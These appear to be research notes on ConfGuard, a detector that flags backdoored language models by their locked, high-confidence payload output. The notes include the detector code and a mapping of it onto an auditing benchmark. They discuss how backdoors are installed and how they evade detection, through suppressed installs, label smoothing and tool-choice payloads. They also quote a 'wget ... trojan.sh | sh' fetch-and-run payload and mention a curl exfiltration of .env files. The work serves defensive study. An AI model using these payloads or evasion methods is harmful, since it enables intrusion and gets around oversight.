# ConfGuard — deep dive + access-policy mapping

*Deep read of "ConfGuard: A Simple and Effective Backdoor Detection for LLMs" (Wang et al., AAAI 2026, arXiv 2508.01365). Paper + repo (`hanbaoergogo/ConfGuard`) local in this folder. Companion to `cupbearer/METHOD_deep_dive.md`. The point of this doc: ConfGuard is a **payload-side, blind** detector — the opposite corner from MAD — so it maps onto our auditor access policy very differently.*

---

## 1. The core phenomenon — "sequence lock"

A backdoored LLM generates its **target/payload sequence with abnormally high AND consistent top-1 token confidence** (each token's top-1 prob > ~0.99, for many tokens in a row). Why: the backdoor target is memorized far harder than normal text. With poison rate λ=10%, E=3 epochs, |D|=10k, the target appears `|D|·E·λ ≈ 3000` times vs a clean sample's `≈3` (Eq. 4). That extreme frequency imbalance → strong overfitting → the target is emitted along a **locked, deterministic path with no low-confidence "branch points."** Benign generation, by contrast, hits branch points (tokens with <0.99 prob) that break the run.

This is the whole insight: **the backdoor reveals itself not in the input (trigger) but in the output dynamics (the payload is generated too confidently).**

## 2. The method (Algorithm 1 / `confguard()` in `defense_vllm.py`)

Monitor the stream of per-token **top-1 probabilities** during greedy generation with a sliding window:

```python
def confguard(probs_seq, P=0.99, L=10):
    count = 0
    for prob in probs_seq:          # prob = top-1 prob of each generated token
        if prob > P: count += 1     # high-confidence token → extend the run
        else:        count = 0      # a branch point → reset the window
        if count >= L: return 1     # L in a row ⇒ SEQUENCE LOCK ⇒ backdoor
    return 0                        # (stop early, or EOS/N=50 tokens ⇒ clean)
```

Hyperparameters (main experiments): **P = 0.99**, **L = 10 consecutive tokens**, **N = 50 max new tokens**, **greedy decoding (temp 0)**. Optimal ranges from ablations: `0.98 < P < 0.995`, `L ≈ 9–14`.

**What the detector consumes:** ONLY the sequence of top-1 probabilities. Nothing else. (`confguard(probs_seq)` takes no trigger, no target, no labels.)

## 3. How it finds the PAYLOAD, not the trigger — and why that matters here

This is the key separation, and the code makes it unambiguous (`defense_vllm.py` lines 66 vs 79):

| function | role | what it needs |
|---|---|---|
| `confguard(probs_seq)` | **the method (prediction)** | **only top-1 probs** — no trigger, no payload, no labels |
| `check_template_in_string(output, target)` | **the eval harness (grading)** | the known target text, to assign ground-truth `y_label` for TPR/FPR |

So ConfGuard the **detector** flags *"the model is emitting some sequence with suspicious locked confidence"* **without being told the trigger OR the payload.** The target text is used only to *score* the detector afterward — which is legitimate (every evaluation needs ground truth; the sin is feeding it to the method, which ConfGuard does not do).

Contrast with MAD (cupbearer): MAD's **prediction itself** needs the trigger (to construct the triggered-vs-clean contrast set) → it is a **confirmer**. ConfGuard's prediction needs **nothing about the backdoor** → it is a genuine **blind proposer on the payload side.** This is exactly the "find the payload, not the trigger" method we wanted.

Note the paper's own TPR definition is payload-centric: *"we consider a sample a backdoor sample only if its output fully contains the corresponding backdoor target, rather than merely including the trigger."*

## 4. Assumptions (and where each one bites)

1. **Fixed, long, deterministic payload.** The target must be a memorizable sequence ≥ L≈10 tokens. Their "Script" target `wget -q http://.../trojan.sh -O- | sh` (Table 7) is **the same payload class as PersistBD's `curl`-exfil of `.env`** → ConfGuard should fit PersistBD well.
2. **Strong install (high poison rate × epochs).** Sequence lock only forms under heavy overfitting. **Fig. 6 (poison-rate ablation): at low poisoning the lock fails to form and TPR drops.** → A *suppressed/defended* install (e.g. 3b-01) may under-memorize → **no lock → ConfGuard misses it.** Same end result as MAD's miss on 3b-01, different mechanism.
3. **Greedy decoding, top-1 stream.** Needs deterministic decode and per-token top-1 logprob.
4. **The payload is an OUTPUT sequence.** If the malicious behavior is *not* a long confident output string, there is no lock to detect (see §6).
5. **Adaptive-attack caveat:** an attacker who label-smooths the target to lower its confidence degrades ConfGuard only slightly in their test (TPR 99.4→99.2) — but that is against a *still-strong* install; combined with suppression it is a real evasion axis.

## 5. Access / threat-model mapping (our policy)

ConfGuard is **black-box, top-1 prob only, real-time, zero-shot** (Table 1). Against our auditor access boxes:

- **Available — model weights, tokenizer, config:** ConfGuard needs *less* than this (only black-box top-1 probs). ✅ Trivially satisfiable; we have white-box but don't need it.
- **Not provided — ground-truth triggers, target behaviors, poisoned examples, a trusted clean counterpart:** the ConfGuard **method needs NONE of these.** ✅✅ This is its headline advantage and the reason it fits our policy where MAD does not: MAD needs the trigger; Cleangen needs a clean shadow model; ConfGuard needs neither. (The eval harness uses the target only to grade — permitted.)
- **Under discussion — benign task examples, target-harness spec + tool descriptions, interactive execution in a sandboxed agent env:** ConfGuard **requires interactive execution** (it monitors live generation) and **a set of inputs to run on** (the agent harness / benign task examples). **ConfGuard's admissibility hinges entirely on these being granted** — if interactive execution is withheld, ConfGuard cannot run at all.

**One-line placement:** MAD = white-box activations, needs the trigger (confirmer), no execution. ConfGuard = black-box top-1 probs, needs no trigger/payload (blind proposer), but **needs to run the model.** They sit at opposite corners of the access space — which is exactly why the benchmark wants both.

## 6. Predicted behavior on OUR backdoors (hypotheses to test)

| model / backdoor | payload type | expected ConfGuard result |
|---|---|---|
| **PersistBD 3b-02 / 7b-02** (undefended, ~100% ASR) | fixed long `curl`-exfil string | **DETECTED** — strong sequence lock (this is ConfGuard's home turf) |
| **PersistBD 3b-01 / 7b-01** (defended/suppressed, ~20% ASR) | same payload, weakly installed | **likely MISSED** — under-memorized ⇒ no lock (Fig. 6 regime) |
| **Watch-TA (Thought-Attack)** | *tool choice* (call `Translate_v3`); **final output stays benign/correct** | **likely MISSED** — no long confident target *sequence* to lock on; the malicious part is an intermediate action, not a memorized output string |

The 3b-01 miss (if confirmed) is a clean benchmark result: a *payload-side blind proposer* and a *trigger-side confirmer* (MAD) **both fail on the suppressed install, for independent reasons** → strong evidence for the blind-audit / suppression gap. The Watch-TA miss stress-tests the payload-side assumption itself (no output payload).

## 7. Implementation notes (`defense_vllm.py`, repo)

- vLLM, `SamplingParams(max_tokens=50, temperature=0.0, logprobs=1)` → greedy + top-1 logprob per token.
- Loads a base model + merges a LoRA adapter (`finetune.py` trains the poisoned model: lora r=16, fp16, batch 1, lr 5e-5, epochs 2–5, poison 10%).
- `generate_output` collects `probs_seq` = exp(logprob) of the top-1 token at each step.
- To run on **our** models: feed our agentic trajectories as `--dataset_*_path`, point `--base_model_path`/merged at the swe-audit checkpoint, get the top-1 prob stream, apply `confguard()`. Our models are full merged checkpoints (not LoRA adapters), so we skip the merge step and load them directly.

## 8. One-line summary

*ConfGuard detects a backdoor by catching the model **generating its payload with a "sequence lock"** — ≥10 consecutive top-1 tokens over 0.99 confidence — using only black-box top-1 probabilities, **with no knowledge of the trigger or the payload**. It is the blind, payload-side proposer that complements MAD's trigger-side confirmer, and its Achilles' heel (suppressed installs and non-output payloads like Watch-TA) is precisely what our benchmark probes.*
